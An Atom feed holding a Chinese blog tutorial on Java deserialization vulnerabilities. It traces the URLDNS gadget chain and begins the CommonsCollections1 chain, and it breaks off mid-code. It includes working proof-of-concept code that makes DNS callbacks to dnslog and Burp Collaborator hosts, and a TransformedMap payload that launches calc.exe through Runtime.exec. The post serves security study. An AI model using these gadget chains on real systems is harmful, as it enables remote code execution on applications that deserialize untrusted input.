<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chen&#39;Blog</title>
  
  <subtitle>Life has its own fate, and meeting may not be accidental.</subtitle>
  <link href="https://chenzidu.github.io/atom.xml" rel="self"/>
  
  <link href="https://chenzidu.github.io/"/>
  <updated>2024-04-24T09:36:02.814Z</updated>
  <id>https://chenzidu.github.io/</id>
  
  <author>
    <name>ChenZIDu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Java安全-反序列化篇</title>
    <link href="https://chenzidu.github.io/2024/04/24/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/"/>
    <id>https://chenzidu.github.io/2024/04/24/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/</id>
    <published>2024-04-24T09:13:33.000Z</published>
    <updated>2024-04-24T09:36:02.814Z</updated>
    
    <content type="html"><![CDATA[<p><a name="q3r26"></a></p><h2 id="反序列化是什么"><a href="#反序列化是什么" class="headerlink" title="反序列化是什么"></a>反序列化是什么</h2><ol><li><strong>序列化（Serialization）</strong>：<ul><li>序列化是将对象的状态信息转换为可以存储或传输的形式的过程。在 Java 中，这通常意味着将对象转换为字节序列，以便可以将其写入文件、数据库或通过网络发送到另一个系统。</li><li>Java 通过实现 java.io.Serializable 接口来标识一个类是可序列化的。实现 Serializable 接口的类可以被 ObjectOutputStream 类序列化。</li><li>序列化过程中，对象的类、属性和属性值都会被保存。如果对象图中包含其他对象的引用，这些对象也会被递归地序列化。</li><li>序列化的结果是一个字节流，通常保存在  ByteArrayOutputStream 或 FileOutputStream 中。</li></ul></li><li><strong>反序列化（Deserialization）</strong>：<ul><li>反序列化是序列化过程的逆过程。它涉及将保存的字节序列恢复为原来的对象状态。</li><li>在 Java 中，反序列化通常是通过 ObjectInputStream 类来完成的。这个类可以读取先前序列化的对象，并重建原始对象的状态。</li><li>反序列化时，需要确保序列化对象的类定义在当前运行环境中是可用的。如果类定义不可用，或者类的结构在序列化后发生了不兼容的变化，反序列化将失败，并可能抛出异常。</li><li>反序列化后，对象将恢复其原始状态，包括所有属性值和关联的对象引用。<br><a name="eq60t"></a><a id="more"></a></li></ul></li></ol><h4 id="说人话"><a href="#说人话" class="headerlink" title="说人话"></a>说人话</h4><ul><li><strong>Java 序列化</strong> 通常涉及使用 ObjectOutputStream 类将对象转换为字节流，这些字节流可以被存储或传输。</li><li><strong>Java 反序列化</strong> 通常涉及使用 ObjectInputStream 类将存储的字节流恢复为原始对象。<br><a name="pC7iz"></a></li></ul><h2 id="1、URLDNS链学习"><a href="#1、URLDNS链学习" class="headerlink" title="1、URLDNS链学习"></a>1、URLDNS链学习</h2><p><a name="kjXOa"></a></p><h3 id="简介：什么是URLDNS"><a href="#简介：什么是URLDNS" class="headerlink" title="简介：什么是URLDNS?"></a>简介：什么是URLDNS?</h3><p>URLDNS 反序列化链是一种在 Java 应用程序中用于检测反序列化漏洞的技术。这条链的主要作用是触发一个 DNS 请求，以此来验证目标应用程序是否存在反序列化漏洞。在实战环境中我们通常用URLDNS来判断是否存在反序列化漏洞，因为有些环境只有DNS能出网。<br><a name="GFs88"></a></p><h3 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h3><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a> - URLDNS链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//在创建有效负载期间避免DNS解析</span></span><br><span class="line">                <span class="comment">//由于字段java.net. URL.handler是瞬态的</span></span><br><span class="line">                <span class="comment">//它不会成为序列化有效负载的一部分。</span></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// 将包含URL的HashMap</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// 用作密钥的URL</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//该值可以是任何可序列化的值，作为键的URL是触发DNS查找的内容。</span></span><br><span class="line">            </span><br><span class="line">                <span class="comment">// 在上面的put期间，计算并缓存URL的hashCode。</span></span><br><span class="line">                <span class="comment">//这会重置它，以便下次调用hashCode时触发DNS查找。</span></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">"hashCode"</span>, -<span class="number">1</span>); </span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                PayloadRunner.run(URLDNS<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *防止生成POC过程中发起dns请求</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HashMap这个类，<br />可以看到就是创建hashMap过程中，通过PUT数据导致的dns请求，根据注释我们可以知道，通过计算url的hash导致的dns请求。<br />我们跟hashMap类的put方法看看。发现了计算了hash。</p><img src="/2024/04/24/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/1.png" class=""><p><br />继续跟进，如下图，发现计算了hashcode，而我们传入的key为 java.net.URL  ，所以继续跟进查看url类中的hashCode方法。<br /></p><img src="/2024/04/24/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/2.png" class=""><p>transient 关键字，修饰Java序列化对象时，不需要序列化的属性。继续跟进URLStreamHandler类的hashCode方法，图中可以看到hashCode值默认为-1，当值不等于-1，会执行handler.hashcode(this)。<br /></p><img src="/2024/04/24/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/3.png" class=""><img src="/2024/04/24/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/4.png" class=""><p>发现有 getHostAddress  方法，继续跟进</p><img src="/2024/04/24/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/5.png" class=""><p>继续跟进这个函数会发现，InetAddress.getByName(host) 的作用是根据主机名，获取其IP地址，在网络上其实就是一次 DNS查询。  <br /></p><img src="/2024/04/24/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/6.png" class=""><p><a name="RoZWM"></a></p><h4 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">  -&gt; HashMap.hash()</span><br><span class="line">    -&gt; URL.hashCode()</span><br><span class="line">      -&gt; URLStreamHandler.hashCode()</span><br><span class="line">        -&gt; URLStreamHandler.getHostAddress()</span><br></pre></td></tr></table></figure><p><a name="kRFrq"></a></p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        URL u = <span class="keyword">new</span> URL(<span class="string">"http://myc765.dnslog.cn"</span>);</span><br><span class="line">        u.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url =<span class="string">"test"</span>;</span><br><span class="line">        HashMap&lt;URL, String&gt; ht = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        URL u = <span class="keyword">new</span> URL(<span class="string">"https://hfjgk3.dnslog.cn"</span>);</span><br><span class="line">        ht.put(u, url);  <span class="comment">//测试put，这环节会请求dns</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">"java.net.URL"</span>);</span><br><span class="line">        Field m = clazz.getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//反序列化后会请求dns</span></span><br><span class="line">        m.set(u,<span class="number">0xfffff</span>); <span class="comment">//第一次查询的时候会进行缓存，所以让它不等于-1</span></span><br><span class="line">        <span class="comment">// 向HashMap中添加新的键值对</span></span><br><span class="line">        ht.put(u, <span class="string">"test"</span>);</span><br><span class="line">        <span class="comment">// 修改hashCode的值</span></span><br><span class="line">        m.set(u,-<span class="number">1</span>); <span class="comment">//让它等于-1 就是在反序列化的时候等于-1 执行dns查询</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="uy1ch"></a></p><h3 id="测试URLDNS链"><a href="#测试URLDNS链" class="headerlink" title="测试URLDNS链"></a>测试URLDNS链</h3><p><a name="rU8CG"></a></p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><p>序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">urlDndLoad</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url =<span class="string">"test"</span>;</span><br><span class="line">        HashMap&lt;URL, String&gt; ht = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        URL u = <span class="keyword">new</span> URL(<span class="string">"https://v51n4ni6idg5qmakyyofp9zfq6w2kr.burpcollaborator.net"</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">"java.net.URL"</span>);</span><br><span class="line">        Field m = clazz.getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        m.set(u,<span class="number">2</span>); <span class="comment">//第一次查询的时候会进行缓存，所以让它不等于-1</span></span><br><span class="line"></span><br><span class="line">        ht.put(u, <span class="string">"test"</span>); <span class="comment">// 向HashMap中添加新的键值对</span></span><br><span class="line">        <span class="comment">// 修改hashCode的值</span></span><br><span class="line">        m.set(u,-<span class="number">1</span>); <span class="comment">//让它等于-1 就是在反序列化的时候等于-1 执行dns查询</span></span><br><span class="line">        Serializable(ht);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Serializable</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"ser.ser"</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">serTestLoad</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//反序列化类</span></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream((<span class="keyword">new</span> FileInputStream(<span class="string">"ser.ser"</span>)));</span><br><span class="line">        <span class="comment">// 读出来并反序列化</span></span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/04/24/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/7.png" class=""><p><a name="SC5w0"></a></p><h2 id="2、CommonsCollections1链"><a href="#2、CommonsCollections1链" class="headerlink" title="2、CommonsCollections1链"></a>2、CommonsCollections1链</h2><p><a name="dPAtm"></a></p><h3 id="什么是CommonsCollections链"><a href="#什么是CommonsCollections链" class="headerlink" title="什么是CommonsCollections链"></a>什么是CommonsCollections链</h3><ol><li><strong>构造恶意对象</strong>：攻击者创建一个包含恶意代码的集合对象，比如一个 Map。</li><li><strong>利用 Transformer</strong>：通过 Commons Collections 中的 Transformer 类，攻击者可以定义一个转换逻辑，这个逻辑在反序列化时执行。</li><li><strong>利用 AnnotationInvocationHandler</strong>：AnnotationInvocationHandler 是 Java 中的一个私有类，它可以被用来调用任何方法。通过构造特定的 Transformer，攻击者可以触发 AnnotationInvocationHandler 的构造函数。</li><li><strong>执行 Runtime.exec</strong>：通过 AnnotationInvocationHandler，攻击者可以调用 Runtime 类的 exec 方法，从而执行任意命令。</li><li><strong>反序列化</strong>：当应用程序反序列化了攻击者构造的恶意对象时，会触发上述的转换逻辑，最终导致任意代码执行。<br><a name="yMvnz"></a></li></ol><h3 id="基础知识学习"><a href="#基础知识学习" class="headerlink" title="基础知识学习"></a>基础知识学习</h3><p>学习这条链需要知道几个类和接口：<br /><strong>Transformer</strong></p><ul><li><p>org.apache.commons.collections.Transformer 接口定义了一个单一的方法 transform（），它接受一个对象并返回一个新对象。在 Commons Collections 1 链中，Transformer 用于转换对象，是构建复杂操作链的基础。</p></li><li><p>transform()方法，用来定义具体的转换逻辑，方法接收Object类型的input，处理后将Object返回，在Commons-Collection中，程序提供了多个Transformer的实现类，用来实现不同的TransformedMap类中key、value进行修改的功能。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>TransformedMap</strong></p></li><li><p>TransformedMap 用于对Java标准数据结构Map做装饰器，它将一个 Map 包装起来，decorate（）方法对map中的键值对进行修改，第一个参数为要修饰的Map类，第二个参数和第三个参数作为一个实现Transformer接口的类，用来转换修饰的Map的键、值（为null时不进行转换）。在利用链中，TransformedMap 可以用于在反序列化时触发特定的转换逻辑。</p></li></ul><p><strong>LazyMap</strong></p><ul><li>LazyMap 是一个 Map 的惰性实现，它使用 Transformer 来惰性地计算缺失的键的值。在利用链中，LazyMap 可以用于延迟计算，直到实际需要某个键的值时才进行。</li></ul><p><strong>ConstantTransformer</strong></p><ul><li>ConstantTransformer 是 Transformer 接口的一个实现，它总是返回一个指定的常量值，不管输入是什么。在利用链中，它可以用于提供一致的返回值，从而控制执行流程。</li></ul><p><strong>InvokerTransformer</strong></p><ul><li><p>InvokerTransformer 是 Transformer 接口的一个实现，它允许调用对象的某个方法。在利用链中，它可以用来调用类的方法，如 Runtime.exec()，来执行任意命令、String.toUpperCase()来反转字符。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"c:\\windows\\system32\\calc.exe"&#125;);</span><br><span class="line">invokerTransformer.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure><p>**ChainedTransformer  **</p></li><li><p>ChainedTransformer 是 Apache Commons Collections 库中的一个类，它允许您将多个 Transformer 对象链接或组合在一起，以便对一个对象进行一系列转换。当您有一个对象并且想要对它应用多个转换逻辑时，ChainedTransformer 非常有用。</p></li><li><p>在 Commons Collections 反序列化漏洞利用链中，ChainedTransformer 可以用来串联多个转换操作，这在构造复杂的利用链时特别有用。通过 ChainedTransformer，攻击者可以创建一个复杂的 gadgets 链，每个 gadgets 负责执行利用链中的一个步骤。</p></li></ul><p><strong>sun.reflect.annotation.AnnotationInvocationHandler：</strong></p><ul><li>Java 内部类，用于处理注解的方法调用。在代码中，它被用来创建一个自定义的 InvocationHandler，该处理程序在反序列化时触发 Transformer 链。</li></ul><p>下图来源自P神文章：<br /><img src="/2024/04/24/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/8.png" class=""></p><p><a name="FMtyY"></a></p><h4 id="学习demo"><a href="#学习demo" class="headerlink" title="学习demo"></a>学习demo</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 创建一个原始的 HashMap</span></span><br><span class="line">        Map&lt;String, String&gt; baseMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        baseMap.put(<span class="string">"k1"</span>, <span class="string">"value1"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用于反射对象，String.toUpperCase();</span></span><br><span class="line">        Transformer toUpperCasevalueTransformer = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">"toUpperCase"</span>, <span class="comment">// 方法名</span></span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;&#125;, <span class="comment">// toUpperCase 方法不接受参数，所以参数类型列表为空</span></span><br><span class="line">                <span class="keyword">new</span> Object[] &#123;&#125;  <span class="comment">// 实际参数列表也为空</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用 valueTransformer 包装原始的 HashMap</span></span><br><span class="line">        Map&lt;String, String&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">                baseMap,</span><br><span class="line">                <span class="keyword">null</span>, <span class="comment">// 键不进行转换</span></span><br><span class="line">                toUpperCasevalueTransformer <span class="comment">// 值进行反转转换</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加新的键值对前，先转换值</span></span><br><span class="line">        String originalValue = <span class="string">"value2"</span>;</span><br><span class="line">        Object transformedValue = toUpperCasevalueTransformer.transform(originalValue);</span><br><span class="line">        <span class="comment">// 确保转换后的值是 String 类型</span></span><br><span class="line">        transformedMap.put(<span class="string">"key2"</span>, (String) transformedValue);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 演示转换效果</span></span><br><span class="line">        System.out.println(<span class="string">"原始 Map: "</span> + baseMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="z2z6B"></a></p><h3 id="TransformedMap-poc"><a href="#TransformedMap-poc" class="headerlink" title="TransformedMap-poc"></a>TransformedMap-poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123; "getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123; String.class&#125;, new String[] &#123;"c:\\windows\\system32\\calc.exe" &#125;),&#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">//将多个 Transformer 对象串联起来，形成一个完整的调用链。</span></span><br><span class="line">        <span class="comment">//InvokerTransformer，执⾏Runtime对象的exec⽅法，参数为"c:\\windows\\system32\\calc.exe"</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"xxxx"</span>);</span><br><span class="line">        <span class="comment">//利用TransformedMap.decorate()方法来将ChainedTransformer设置为map装饰器的处理方法</span></span><br><span class="line">        <span class="comment">//调用TransformedMap的put()/setValue()等方法时会触发Transformer链的调用方法。</span></span><br><span 